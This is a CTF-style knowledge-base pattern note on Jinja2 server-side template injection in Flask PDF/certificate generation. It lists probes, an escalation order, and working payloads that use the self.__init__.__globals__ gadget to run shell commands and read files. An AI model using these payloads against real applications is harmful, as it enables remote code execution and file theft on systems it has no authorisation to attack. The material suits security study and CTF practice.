---
doc_kind: pattern
title: "SSTI in Server-Side PDF/Document Generation (Jinja2 self.__init__.__globals__)"
category: web
slug: ssti-pdf-generation-jinja-self-globals
created: 2026-10-25
status: active
tags:
  - ssti
  - jinja2
  - flask
  - pdf-generation
  - render_template_string
chain_summary: "Any user-controlled field that gets embedded into a server-rendered PDF/certificate/report via render_template_string is a classic SSTI target; confirm with an arithmetic probe ({{7*7}}), then pivot to RCE/file-read via self.__init__.__globals__.__builtins__.__import__('os').popen(...).read() when the usual __class__.__mro__ gadget chain is blocked or unneeded."
---
# SSTI in Server-Side PDF/Document Generation (Jinja2 self.__init__.__globals__)

## Chain Summary

- One-line chain: Any user-controlled field that gets embedded into a server-rendered PDF/certificate/report via render_template_string is a classic SSTI target; confirm with an arithmetic probe ({{7*7}}), then pivot to RCE/file-read via self.__init__.__globals__.__builtins__.__import__('os').popen(...).read() when the usual __class__.__mro__ gadget chain is blocked or unneeded.
- Typical target shape: a Flask (or other Jinja2-based) app with a "generate certificate/report/invoice" feature that embeds a user-editable profile field (name, address, notes, etc.) into a server-rendered PDF or HTML-to-PDF document.

## Preconditions

- A user-controlled field (profile data, form input) is reachable by a downstream document-generation feature, even if that field is set via a completely separate endpoint from the one that triggers generation.
- The document-generation code path calls `render_template_string(user_value)` or an equivalent "render this string as a template" API, rather than passing `user_value` only as template *context* (the latter is safe from SSTI).

## Cheap Probes

- Set the candidate field to an arithmetic expression (`{{7*7}}`) and trigger generation; if the rendered output shows `49` instead of the literal string, server-side template execution is confirmed.
- If the profile-update endpoint silently no-ops, check whether it requires *all* form fields to be present in the request body, not just the one being tested — a partial update can fail silently and be misdiagnosed as "the payload doesn't render."

## Telltale Evidence

- The document literally displays the evaluated result of an injected expression (a number instead of `{{7*7}}`) rather than the raw text — distinguishes real SSTI from simple unescaped-HTML reflection.

## Escalation Order

1. Confirm SSTI with `{{7*7}}`.
2. Enumerate the filesystem to find the flag/target file: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /').read() }}`.
3. Read the target file with the same gadget: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat <path>').read() }}`.
4. Extract the result from the generated document (e.g. `pdftotext cert.pdf -` for a PDF, or just read the rendered HTML/text directly) and regex out the flag format.

## Common Mistakes

- Only trying the classic `''.__class__.__mro__[1].__subclasses__()` subclass-walk gadget and giving up if it's filtered/blocked, instead of trying `self.__init__.__globals__.__builtins__` — a shorter path that works whenever the template context exposes `self` (common in macro/class-based render paths) and doesn't require enumerating subclasses at all.
- Misreading a silently-ignored partial form update as a failed injection, rather than checking whether the endpoint requires the full field set to persist any change.

## Payload Shapes

```text
{{7*7}}

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /').read() }}

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}
```

## Related Writeups

- `knowledge/writeups/web/jinjacare-ssti-pdf-certificate.md`

## Skill Impact

- Related skill: `web-triage` (SSTI branch)
- Rule to add or update: when a feature generates a document/PDF/report from stored profile data, treat every embedded field as an SSTI candidate even if the field is set through a completely different endpoint than the one that triggers generation; try the `self.__init__.__globals__.__builtins__` gadget as a first-choice shortcut before the longer `__class__.__mro__.__subclasses__()` walk.
